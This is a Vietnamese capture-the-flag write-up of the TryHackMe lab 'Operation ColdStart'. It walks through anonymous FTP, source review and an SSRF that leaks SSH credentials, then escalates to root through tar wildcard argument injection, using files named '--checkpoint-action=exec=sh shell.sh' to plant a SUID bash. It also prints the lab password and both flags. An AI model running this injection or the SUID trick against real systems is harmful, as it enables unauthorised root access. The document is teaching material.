# Writeup: Operation Coldstart (TryHackMe)
Thông tin bài Lab
Tên phòng: Operation ColdStart
Hệ điều hành: Linux
Độ khó: Dễ (Easy)
Mục tiêu: Chiếm quyền SSH người dùng (user.txt) và nâng cấp quyền lên root (root.txt).
IP mục tiêu (Ví dụ trong bài): 10.48.137.97

# 1. Trinh sát & Thu thập thông tin (Reconnaissance)
## Bước 1: Quét cổng mạng (Port Scanning)
Sử dụng nmap để quét toàn bộ cổng trên máy mục tiêu:

Bash
`nmap -p- --min-rate 5000 -T4 10.48.137.97`
Kết quả mở cổng:
```
21/tcp: FTP
22/tcp: SSH
80/tcp: HTTP
```
## Bước 2: Dò phiên bản dịch vụ (Service Enumeration)
Quét chi tiết phiên bản và kịch bản NSE trên các cổng tìm được:

Bash
`nmap -sCV -p21,22,80 10.48.137.97`
Thông tin quan trọng:
```
FTP (vsftpd 3.0.5): Cho phép đăng nhập ẩn danh (Anonymous FTP Login Allowed).
SSH (OpenSSH 9.6p1): Dịch vụ đăng nhập từ xa.
HTTP (Gunicorn): Chạy ứng dụng web "Volt Labs" có tính năng URL Preview.
```
# 2. Thâm nhập ban đầu (Initial Access)
## Bước 1: Khai thác dịch vụ FTP
Đăng nhập FTP ẩn danh để tìm kiếm tài liệu nhạy cảm:

Bash
`ftp anonymous@10.48.137.97`
Vào thư mục pub, phát hiện và tải tệp sao lưu:

Plaintext
`ftp> cd pub`
`ftp> get backup.tar.gz`
## Bước 2: Phân tích mã nguồn (Source Code Review)
Giải nén tệp backup.tar.gz trên máy tấn công:

Bash
`tar -xvf backup.tar.gz`
Các tệp thu được: `README.md`, `app.py`, `requirements.txt`.

Giải thích bản chất mã nguồn (app.py):

Khi đọc `app.py`, phát hiện biến cấu hình:

Python
`ALLOWED_HOSTS = {"kestrel.thm"}`
Ứng dụng chỉ chấp nhận các yêu cầu HTTP có Host header là kestrel.thm.

Kiểm tra đường dẫn nội bộ (Internal Endpoint):
Phát hiện endpoint `/admin/notes` bị chặn truy cập từ bên ngoài, chỉ cho phép máy cục bộ (loopback) truy cập.

## Bước 3: Khai thác SSRF / Vượt qua kiểm tra tên miền
Vì tính năng URL Preview của web app chỉ chấp nhận kestrel.thm, chúng ta thêm tên miền này vào tệp /etc/hosts của máy tấn công (trỏ tới IP mục tiêu) hoặc lợi dụng cơ chế xem trước URL của ứng dụng để gửi truy vấn tới [http://kestrel.thm/admin/notes](http://kestrel.thm/admin/notes).

TRÊN GIAO DIỆN URL PREVIEW CỦA WEB:
Điền URL: `http://kestrel.thm/admin/notes`

Kết quả trả về từ ghi chú nội bộ (Internal Notes):

Plaintext
```
=== INTERNAL ===
SSH access for staging:
user: webdev
pass: V0ltLabs#summer - Mara
```
## Bước 4: Đăng nhập SSH & Lấy User Flag
Dùng thông tin tài khoản vừa tìm được để đăng nhập SSH:

Bash
`ssh webdev@10.48.137.97`
Nhập mật khẩu: `V0ltLabs#summer`
Đọc cờ người dùng:

Bash
`cat user.txt`
User Flag: `THM{96dc7bd50d2fb98fcece01560788b5ab}`

# 3. Leo thang đặc quyền (Privilege Escalation)
## Bước 1: Kiểm tra quyền sudo
Bash
`sudo -l`
Kết quả: User webdev không có quyền chạy sudo.

## Bước 2: Phát hiện Tác vụ Cron (Cron Job Enumeration)
Kiểm tra các file cấu hình cron job trong hệ thống:

Bash
`cat /etc/cron.d/voltlabs-backup`
Nội dung file cron job:

Bash
```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```
Giải thích bản chất lỗi:

Tác vụ này chạy mỗi phút một lần dưới quyền root.

Tác vụ di chuyển vào /opt/backups và chạy lệnh tar czf /var/backups/uploads.tgz *.

Việc sử dụng dấu ký tự đại diện wildcard * cùng với quyền ghi của user webdev trong /opt/backups dẫn đến lỗi Tar Wildcard Argument Injection.

## Bước 3: Thực thi Wildcard Injection
Chuyển vào thư mục sao lưu:

Bash
`cd /opt/backups`
Tạo tệp thực thi (shell.sh):

Bash
`echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh`
`chmod +x shell.sh`
Nhiệm vụ: Đoạn script này sẽ sao chép chương trình bash sang /tmp và bật cờ SUID (chmod +s).

Tạo các tệp giả mạo tham số lệnh tar:

Bash
`touch -- '--checkpoint=1'`
`touch -- '--checkpoint-action=exec=sh shell.sh'`
Nhiệm vụ: Dấu -- giúp lệnh touch hiểu chuỗi phía sau là tên tệp thực sự.

Khi cron job thực thi `tar czf ... *`, dấu * bung rộng ra thành danh sách tất cả các tệp trong thư mục. Lệnh tar hiểu các tên tệp này như tham số dòng lệnh:

`--checkpoint=1`: Dừng lại sau mỗi tệp được lưu trữ.

`--checkpoint-action=exec=sh shell.sh`: Thực thi lệnh hệ thống sh shell.sh ngay tại điểm dừng checkpoint dưới quyền sở hữu của tiến trình (quyền root).

## Bước 4: Thu nhận Shell Root & Lấy Root Flag
Đợi khoảng 1 phút cho Cron Job kích hoạt. Kiểm tra xem file /tmp/bash đã được tạo ra với quyền SUID chưa:

Bash
`ls -l /tmp/bash`
Thực thi bash với tham số -p (giữ nguyên quyền SUID root):

Bash
`/tmp/bash -p`
`whoami`
Kết quả: root
Đọc cờ tối cao:

Bash
`cat /root/flag.txt`
Root Flag: `THM{e6ee84a483d67ade06936fcfd1433e8a}`

Sơ đồ tóm tắt lộ trình tấn công (Attack Path)
Plaintext
```
  [ Quét cổng Nmap ]
          │
          ▼
  [ Cho phép Anonymous FTP ] ──► Tải về backup.tar.gz
          │
          ▼
  [ Đọc mã nguồn app.py ] ──► Phát hiện Allow-list (kestrel.thm) & Endpoint /admin/notes
          │
          ▼
  [ Khai thác SSRF/Host Header ] ──► Trích xuất tài khoản webdev : V0ltLabs#summer
          │
          ▼
  [ Đăng nhập SSH (webdev) ] ──► Đọc user.txt
          │
          ▼
  [ Kiểm tra Cron Job root ] ──► Phát hiện `tar czf ... *` tại /opt/backups
          │
          ▼
  [ Tar Wildcard Injection ] ──► Tạo SUID Bash /tmp/bash
          │
          ▼
  [ Chạy /tmp/bash -p ] ──► Chiếm quyền ROOT ──► Đọc root.txt
```
# Cốt lõi bài học kinh nghiệm (Key Takeaways)
Dịch vụ FTP ẩn danh (Anonymous FTP): Rất dễ dẫn đến lộ rò rỉ mã nguồn hoặc dữ liệu sao lưu nhạy cảm.

Hardcode & Internal Endpoints: Các ghi chú kỹ thuật hoặc thông tin đăng nhập thử nghiệm (staging) lưu trong thư mục quản trị nội bộ luôn là mục tiêu hàng đầu của kẻ tấn công thông qua lỗ hổng SSRF.

Ký tự đại diện Wildcard (*) trong Linux Scripting: Tuyệt đối không sử dụng * trực tiếp với các lệnh như tar, chmod, chown trong các Cron job chạy với quyền root, vì kẻ tấn công có quyền ghi thư mục có thể dễ dàng chen tham số điều khiển (Argument Injection) để thực thi lệnh tùy ý.
